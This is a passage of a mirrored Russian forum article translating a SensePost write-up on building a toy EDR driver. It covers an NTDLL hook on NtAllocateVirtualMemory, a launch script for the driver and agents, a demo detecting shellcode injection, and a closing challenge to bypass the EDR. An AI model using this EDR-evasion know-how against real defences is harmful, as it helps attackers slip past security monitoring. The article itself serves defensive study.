+<div class="bbImageWrapper  js-lbImage" title="1750611130078.png"
+		data-src="https://osint42.org/attachments/1750611130078-png.697/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611130078-png.697/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611130078.png"
+			title="1750611130078.png"
+			width="812" height="233" loading="lazy" />
+	</div><br />
+<br />
+Тогда более законный разобранный код должен выглядеть так:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750611139405.png"
+		data-src="https://osint42.org/attachments/1750611139405-png.698/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611139405-png.698/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611139405.png"
+			title="1750611139405.png"
+			width="740" height="168" loading="lazy" />
+	</div><br />
+<br />
+Как видно, первая команда ассемблера в перехваченной функции NtAllocateVirtualMemory - это jmp, который перенаправляет поток кода из NTDLL.dll на адрес &quot;00007FFAA06A0FD6&quot;, который является... нашей внедренной DLL для EDR:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750611149426.png"
+		data-src="https://osint42.org/attachments/1750611149426-png.699/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611149426-png.699/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611149426.png"
+			title="1750611149426.png"
+			width="955" height="166" loading="lazy" />
+	</div><br />
+<br />
+На данном этапе наш EDR полностью функционален! Давайте протестируем его!<br />
+<br />
+<b>VIII/ Демонстрация MyDumbEDR</b><br />
+<br />
+Теперь, когда у нас есть два агента и драйвер, мы можем скомпилировать их и запустить проект целиком, чтобы увидеть его в действии!<br />
+Чтобы упростить запуск всего решения EDR, я создал небольшой пакетный скрипт со следующим содержанием:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Bash:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="bash"><code>// Launches the kernel driver
+sc create mydumbedr type=kernel binpath=Z:\windev\MyDumbEDR\x64\Debug\MyDumbEDRDriver.sys
+sc start mydumbedr
+// Starts the StaticAnalyzer agent
+start cmd.exe /c Z:\windev\MyDumbEDR\x64\Debug\MyDumbEDRStaticAnalyzer.exe
+// Starts the RemoteInjector agent
+start cmd.exe /c Z:\windev\MyDumbEDR\x64\Debug\MyDumbEDRRemoteInjector.exe
+// Starts dbgview.exe
+start dbgview.exe
+
+echo EDR&#039;s running, press any key to stop it
+pause
+
+// Kills both agents and unloads the kernel driver
+taskkill /F /IM MyDumbEDRStaticAnalyzer.exe
+taskkill /F /IM MyDumbEDRRemoteInjector.exe
+sc stop mydumbedr
+sc delete mydumbedr</code></pre>
+	</div>
+</div><br />
+Давайте запустим EDR, откроем процесс блокнота, который станет целью для внедрения shellcode, и запустим бинарный файл ShellcodeInjector, чтобы увидеть, как работает EDR в режиме реального времени:<br />
+<br />
+<div class="bbMediaWrapper" data-media-site-id="youtube" data-media-key="iqcttCwX7kc">
+	<div class="bbMediaWrapper-inner">
+		<iframe src="https://www.youtube.com/embed/iqcttCwX7kc?wmode=opaque"
+				loading="lazy"
+				width="560" height="315"
+				frameborder="0" allowfullscreen="true"></iframe>
+	</div>
+</div><br />
+Как вы можете видеть, агент StaticAnalyzer обнаружил, что бинарный файл является вредоносным. RemoteInjector внедрил MyDumbEDRDLL во вредоносный процесс, и когда он попытался выделить страницу памяти с правами RWX для записи и выполнения shellcode, EDR обнаружил это и завершил процесс, защищая процесс notepad.exe.<br />
+<br />
+Таким образом, мы можем сказать, что наш EDR достаточно мощен, чтобы обнаруживать как статически, так и динамически вредоносные бинарные файлы, пытающиеся провести удаленное внедрение shellcode!<br />
+<br />
+<b>IX/ Заключение</b><br />
+<br />
+В этой статье мы узнали, как разрабатывать драйвер Windows, как превратить его в ядерный драйвер EDR и как построить простой EDR.<br />
+<br />
+<b>Есть 3 причины, по которым я хотел создать такую вещь:</b><br />
+<br />
+Во-первых, я хотел лучше понять архитектуру EDR, чтобы я мог научиться анализировать те, с которыми я сталкиваюсь во время пентестов.<br />
+<br />
+Во-вторых, я хотел провести это исследование, чтобы написать статью, которую может использовать любой, кто, как и я, хочет понять, как работают EDR, и дать им несколько идей о том, как их можно обойти.<br />
+<b><u>По этой причине я оставляю вам вызов: обойдите MyDumbEDR.</u></b><br />
+<br />
+<a href="https://github.com/sensepost/mydumbedr" target="_blank" class="link link--external" rel="noopener">В следующем репозитории вы найдете исходный код EDR</a>, созданного в этой статье, а также инструкции по сборке. Есть несколько способов его обойти, поэтому я призываю вас внимательно изучить код. Я реализовал некоторую глупую логику, <b><u>которая фактически используется некоторыми EDR.</u></b><br />
+<br />
+Последней причиной, по которой я хотел создать свой EDR, было видеть, насколько сложно создать функциональный продукт.<br />
+<br />
+Как пентестеры и команды красной команды, мы привыкли говорить такие вещи, как «Ха-ха, этот EDR ужасен, я легко его обошел». Да, ты справился, поздравляю. Но помни, что создание продукта безопасности, который способен как обнаруживать вредоносное поведение, так и не создавать слишком много ложных срабатываний, — это большая проблема.<br />
+<br />
+Поэтому я бы хотел завершить эту статью, отдав огромное уважение как разработчикам продуктов безопасности, так и командам синей команды, которые борются с красными во время наших пентестов!<br />
+<br />
+Счастливого взлома, друзья!</div>
+					
+
+					
+						
+
+	
+		
+	
+
+					
+					
+										
+
+					
+
+					
+						
+					
+
+					
+
+					
+
+					<div class="reactionsBar js-reactionsList is-active">
+						
+	
+	
+		<ul class="reactionSummary">
+		
+			<li><span class="reaction reaction--small reaction--1" data-reaction-id="1"><i aria-hidden="true"></i><img src="../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f44d.png" loading="lazy" width="64" height="64" class="reaction-image reaction-image--emoji js-reaction" alt="Like" title="Like" /></span></li>
+		
+		</ul>
+	
+
+
+<span class="u-srOnly">Реакции:</span>
+<a class="reactionsBar-link" href="reactions.html" data-xf-click="overlay" data-cache="false" rel="nofollow"><bdi>HMCoba</bdi></a>
+					</div>
+
+					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
+				</article>
+			</div>
+		</div>
+	</div>
+	
+	
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<div class="columnContainer"
+		data-xf-init="lightbox"
+		data-lb-id="article-48"
+		data-lb-universal="0">
+
+		<span class="u-anchorTarget" id="comments"></span>
+
+		<div class="columnContainer-comments">
+			
+	
+	
+
+	<div class="block block--messages"
+		data-xf-init=""
+		data-type="ams_comment"
+		data-href="/inline-mod/">
+
+		
+	
+	
+
+
+		<div class="block-outer"></div>
+		
+		<div class="block-container"
+			data-xf-init="select-to-quote"
+			data-message-selector=".js-comment">
+			
+			<h3 class="block-header">Комментарии</h3>
+			<div class="block-body js-replyNewCommentContainer">
+				
+					<div class="blockMessage js-replyNoMessages">Нет комментариев для отображения.</div>
+				
+			</div>
+		</div>
+
+		<div class="block-outer block-outer--after">
+			
+			
+		</div>
+
+		
+	
+	
+
+	</div>
+
+	
+	
+	
+
+	
+
+
+		</div>
+	</div>	
+
+
+
+
+
+		
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+
+	
+
+
+
+	
+
+
+
+
+	
+</div>
+					
+				</div>
+
+				
+					<div class="p-body-sidebar">
+						
+						
+							<div class="block">
+		<div class="block-container">
+			<h3 class="block-minorHeader">Информация о статье</h3>
+			<div class="block-body block-row block-row--minor">
+				<dl class="pairs pairs--justified">
+					<dt>Автор</dt>
+					
+						<dd><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></dd>
+					
+				</dl>
+				
+					<dl class="pairs pairs--justified">
+						<dt>Article read time</dt>
+						<dd>30 min read</dd>
+					</dl>
+				
+				
+					<dl class="pairs pairs--justified">
+						<dt>Просмотры</dt>
+						<dd>283</dd>
+					</dl>
+				
+				
+				
+				
+					<dl class="pairs pairs--justified">
+						<dt>Последнее обновление</dt>
+						<dd><time  class="u-dt" dir="auto" datetime="2025-06-22T19:52:56+0300" data-timestamp="1750611176" data-date="22.06.2025" data-time="19:52" data-short="22 Июн" title="22.06.2025 в 19:52">22.06.2025</time></dd>
+					</dl>
+				
+				
+				
+
+				
+			</div>
+		</div>
+	</div>
+						
+							<div class="block">
+			<div class="block-container">
+				<h3 class="block-minorHeader"><a href="../categories/issledovaniye-zashchity-operatsionnykh-sistem.8/index.html">Больше в Исследование защиты операционных систем</a></h3>
+				<div class="block-body block-row">
+					<ul class="articleSidebarList">
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../uyazvimosti-v-bash-skriptakh.69/index.html">Уязвимости в bash скриптах</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Вот кто хоть раз интересовался безопасностью, наверное помнят всякие инъекции в php и не...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../o-tom-k-chemu-privodit-profanatsiya.60/index.html">О том к чему приводит профанация</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				О наболевшем...
+
+Аэрофлот отчитался-аж в 2022 году, что перешел на отечественные IT-сервисы.
+
+Но...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../igry-s-uyazvimostyami.50/index.html">Игры с уязвимостями</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Всем привет!
+
+В сети много статей, где рассматриваются две ключевые уязвимости в приложениях...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../arkhitektura-microsoft-defender-antivirus.47/index.html">Архитектура Microsoft Defender Antivirus</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Перевод:https://retooling.io/blog/an-unexpected-journey-into-microsoft-defenders-signature-world...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../reverse-engineering-dlya-nachinayushchikh.41/index.html">Reverse Engineering для начинающих</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Если интересен реверс, то рекомендую эту книгу.)
+
+У термина «reverse engineering» несколько...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+					</ul>
+				</div>
+			</div>
+		</div>
+						
+							<div class="block">
+			<div class="block-container">
+				
+					<h3 class="block-minorHeader"><a href="../authors/0x42.1/index.html">Больше от 0x42</a></h3>
+				
+
+				<div class="block-body block-row">
+					<ul class="articleSidebarList">
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../o-tom-kak-boryut-sya-s-tor-v-rf.75/index.html">О том как борются с TOR в РФ</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Недавно решил поддержать проект TOR, решил поднять middle relay.
+
+Напомню, что для поддержки...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../bezumnyi-maks-skam.74/index.html">Безумный МАКС/СКАМ</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				По телевизору передают, что мессенджер МАКС полюбили россияне, зарегистрировалось почти вся...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../pochemu-v-linux-vse-fail.73/index.html">Почему в Linux всё — файл?</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				---
+
+## 🔹 Оглавление
+
+[1. Философия UNIX: «Everything is a file»]
+[2. Как работает VFS — Virtual...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../obkhod-antivirusov-cherez-uyazvimyi-draiver.71/index.html">Обход антивирусов через уязвимый драйвер</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Пока хакер не прикрыли, из-за дурацких законов, решил скопировать приватную статью.
+
+Вот...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../zashchita-ot-roskomnadzora.70/index.html">Защита от Роскомнадзора</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				В связи с тем-что РКН внедрили ботов для автоматического поиска неугодного контента и...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+					</ul>
+				</div>
+			</div>
+		</div>
+						
+							<div class="block">
+				<div class="block-container">
+					
+						<h3 class="block-minorHeader">Поделиться этой статьей</h3>
+						
+							<div class="block-body block-row block-row--separated">
+								
+									
+
+	
+
+	
+		
+
+		<div class="shareButtons shareButtons--iconic" data-xf-init="share-buttons" data-page-url="" data-page-title="" data-page-desc="" data-page-image="">
+			<span class="u-anchorTarget" id="_xfUid-1-1758965463"></span>
+
+			
+
+			<div class="shareButtons-buttons">
+				
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+						<a class="shareButtons-button shareButtons-button--email" href="#_xfUid-1-1758965463" data-href="mailto:?subject={title}&amp;body={url}">
+							<i class="fa--xf far fa-envelope "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#envelope"></use></svg></i>
+							<span>Электронная почта</span>
+						</a>
+					
+
+					
+						<a class="shareButtons-button shareButtons-button--share is-hidden" href="#_xfUid-1-1758965463"
+							data-xf-init="web-share"
+							data-title="" data-text="" data-url=""
+							data-hide=".shareButtons-button:not(.shareButtons-button--share)">
+
+							<i class="fa--xf far fa-share-alt "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#share-alt"></use></svg></i>
+							<span>Поделиться</span>
+						</a>
+					
+
+					
+						<a class="shareButtons-button shareButtons-button--link is-hidden" href="#_xfUid-1-1758965463" data-clipboard="{url}">
+							<i class="fa--xf far fa-link "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#link"></use></svg></i>
+							<span>Ссылка</span>
+						</a>
+					
+				
+			</div>
+		</div>
+	
+
+								
+							</div>
+						
+						
+							<div class="block-body block-row block-row--separated">
+								
+									
+										
+	
+
+	
+
+	<div class="shareInput" data-xf-init="share-input" data-success-text="">
+		
+			<label class="shareInput-label" for="_xfUid-2-1758965463">Копировать BB-код адреса статьи</label>
+		
+		<div class="inputGroup inputGroup--joined">
+			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
+				data-xf-init="tooltip" title="Скопировать в буфер обмена">
+
+				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
+			</div>
+			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[URL=&quot;https://osint42.org/articles/arkhitektura-antivirusov-i-edr-sistem.48/&quot;]Архитектура антивирусов и EDR - систем[/URL]" id="_xfUid-2-1758965463" />
+		</div>
+	</div>
+
+									
+									
+										
+	
+
+	
+
+	<div class="shareInput" data-xf-init="share-input" data-success-text="">
+		
+			<label class="shareInput-label" for="_xfUid-3-1758965463">Копировать BB-код статьи</label>
+		
+		<div class="inputGroup inputGroup--joined">
+			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
+				data-xf-init="tooltip" title="Скопировать в буфер обмена">
+
+				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
+			</div>
+			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[AMS=article, 48][/AMS]" id="_xfUid-3-1758965463" />
+		</div>
+	</div>
+
+									
+								
+							</div>
+						
+					
+				</div>
+			</div>
+						
+						
+					</div>
+				
+			</div>
+
+			
+			
+	
+		<ul class="p-breadcrumbs p-breadcrumbs--bottom"
+			itemscope itemtype="https://schema.org/BreadcrumbList">
+			
+				
+
+				
+				
+
+				
+
+				
+				
+					
+					
+	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+		<a href="../categories/issledovaniye-zashchity-operatsionnykh-sistem.8/index.html" itemprop="item">
+			<span itemprop="name">Исследование защиты операционных систем</span>
+		</a>
+		<meta itemprop="position" content="1" />
+	</li>
+
+				
+			
+		</ul>
+	
+
+			
+		</div>
+	</div>
+
+	<footer class="p-footer" id="footer">
+		<div class="p-footer-inner">
+
+			<div class="p-footer-row">
+				
+					<div class="p-footer-row-main">
+						<ul class="p-footer-linkList">
+							
+								
+								
+									<li>
+										
+											
+											
+												<a href="https://osint42.org/misc/style-variation" rel="nofollow"
+													class="js-styleVariationsLink"
+													data-xf-init="tooltip" title=" Выбор стиля"
+													data-xf-click="menu" data-z-index-ref=".u-bottomFixer" role="button" aria-expanded="false" aria-haspopup="true">
+
+													<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Выбор стиля</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+												</a>
+
+												<div class="menu" data-menu="menu" aria-hidden="true">
+													<div class="menu-content js-styleVariationsMenu">
+														
+
+	
+		
+
+	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965463%2C4d315f9ba9acb38825e6e3ace4a076d2"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="">
+
+		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>
+
+		
+			Системный
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965463%2C4d315f9ba9acb38825e6e3ace4a076d2"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="default">
+
+		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>
+
+		
+			Светлый
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965463%2C4d315f9ba9acb38825e6e3ace4a076d2"
+		class="menu-linkRow is-selected"
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="alternate">
+
+		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+
+		
+			Тёмный
+		
+	</a>
+
+	
+
+	
+		
+	
+
+													</div>
+												</div>
+											
+										
+									</li>
+								
+								
+									<li><a href="../../misc/language.html" data-xf-click="overlay"
+										data-xf-init="tooltip" title="Выбор языка" rel="nofollow">
+										<i class="fa--xf far fa-globe "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#globe"></use></svg></i> Русский (RU)</a></li>
+								
+							
+						</ul>
+					</div>
+				
+				<div class="p-footer-row-opposite">
+					<ul class="p-footer-linkList">
+						
+
+						
+							<li><a href="../../threads/pravila-resursa.56/index.html">Условия и правила</a></li>
+						
+
+						
+							<li><a href="../../help/privacy-policy/index.html">Политика конфиденциальности</a></li>
+						
+
+						
+							<li><a href="../../help/index.html">Помощь</a></li>
+						
+
+						
+							<li><a href="../../forums/index.html">Главная</a></li>
+						
+
+						<li><a href="../../forums/-/index.rss" target="_blank" class="p-footer-rssLink" title="RSS"><span aria-hidden="true"><i class="fa--xf far fa-rss "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#rss"></use></svg></i><span class="u-srOnly">RSS</span></span></a></li>
+					</ul>
+				</div>
+			</div>
+
+			
+
+			
+		</div>
+	</footer>
+</div> <!-- closing p-pageWrapper -->
+
+<div class="u-bottomFixer js-bottomFixTarget">
+	
+	
+</div>
+
+<div class="u-navButtons js-navButtons">
+	<a href="javascript:" class="button button--scroll"><span class="button-text"><i class="fa--xf far fa-arrow-left "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-left"></use></svg></i><span class="u-srOnly">Назад</span></span></a>
+</div>
+
+
+	<div class="u-scrollButtons js-scrollButtons" data-trigger-type="both">
+		<a href="#top" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-up "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-up"></use></svg></i><span class="u-srOnly">Верх</span></span></a>
+		
+			<a href="#footer" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-down "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-down"></use></svg></i><span class="u-srOnly">Низ</span></span></a>
+		
+	</div>
+
+
+
+	<form style="display:none" hidden="hidden">
+		<input type="text" name="_xfClientLoadTime" value="" id="_xfClientLoadTime" title="_xfClientLoadTime" tabindex="-1" />
+	</form>
+
+	
+
+
+
+
+
+    
+    
+        
+        
+            <script type="application/ld+json">
+                {
+    "@context": "https://schema.org",
+    "@type": "CreativeWorkSeries",
+    "@id": "https://osint42.org/articles/arkhitektura-antivirusov-i-edr-sistem.48/",
+    "name": "\u0410\u0440\u0445\u0438\u0442\u0435\u043a\u0442\u0443\u0440\u0430 \u0430\u043d\u0442\u0438\u0432\u0438\u0440\u0443\u0441\u043e\u0432 \u0438 EDR - \u0441\u0438\u0441\u0442\u0435\u043c",
+    "headline": "\u0410\u0440\u0445\u0438\u0442\u0435\u043a\u0442\u0443\u0440\u0430 \u0430\u043d\u0442\u0438\u0432\u0438\u0440\u0443\u0441\u043e\u0432 \u0438 EDR - \u0441\u0438\u0441\u0442\u0435\u043c",
+    "alternativeHeadline": "\u0410\u0440\u0445\u0438\u0442\u0435\u043a\u0442\u0443\u0440\u0430 \u0430\u043d\u0442\u0438\u0432\u0438\u0440\u0443\u0441\u043e\u0432 \u0438 EDR - \u0441\u0438\u0441\u0442\u0435\u043c",
+    "description": "\u041f\u0435\u0440\u0435\u0432\u043e\u0434 \u0441\u0442\u0430\u0442\u044c\u0438:SensePost | Sensecon 23: from windows drivers to an almost fully working edr\n\n\u041a\u0440\u0430\u0442\u043a\u043e: \u042f \u0445\u043e\u0442\u0435\u043b \u043b\u0443\u0447\u0448\u0435 \u043f\u043e\u043d\u044f\u0442\u044c EDR (Endpoint Detection and Response), \u043f\u043e\u044d\u0442\u043e\u043c\u0443 \u0441\u043e\u0437\u0434\u0430\u043b \u0444\u0438\u043a\u0442\u0438\u0432\u043d\u043e\u0435 EDR (dummy EDR) \u0438 \u0440\u0430\u0441\u0441\u043a\u0430\u0436\u0443 \u043e\u0431 \u044d\u0442\u043e\u043c \u0437\u0434\u0435\u0441\u044c.\n\nEDR (Endpoint...",
+    "keywords": "",
+    "dateCreated": "2025-06-22T16:52:56+00:00",
+    "dateModified": "2025-06-22T16:52:56+00:00",
+    "author": {
+        "@type": "Person",
+        "name": "0x42"
+    },
+    "thumbnailUrl": "https://osint42.org/data/attachments/0/669-3fbc1bd5704e61c171cba1ea66ff70e4.jpg?hash=rdhEsuycpV",
+    "interactionStatistic": [
+        {
+            "@type": "InteractionCounter",
+            "interactionType": "https://schema.org/CommentAction",
+            "userInteractionCount": "0"
+        },
+        {
+            "@type": "InteractionCounter",
+            "interactionType": "https://schema.org/LikeAction",
+            "userInteractionCount": "1"
+        },
+        {
+            "@type": "InteractionCounter",
+            "interactionType": "https://schema.org/ViewAction",
+            "userInteractionCount": "283"
+        }
+    ]
+}
+            </script>
+        
+    
+
+
+
+	
+			
+	
+
+				
+			
+		
+		
+	
+
+</body>
+
+<!-- Mirrored from osint42.org/articles/arkhitektura-antivirusov-i-edr-sistem.48/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:35:35 GMT -->
+</html>
+
+
+
+
+
+
+
+
+
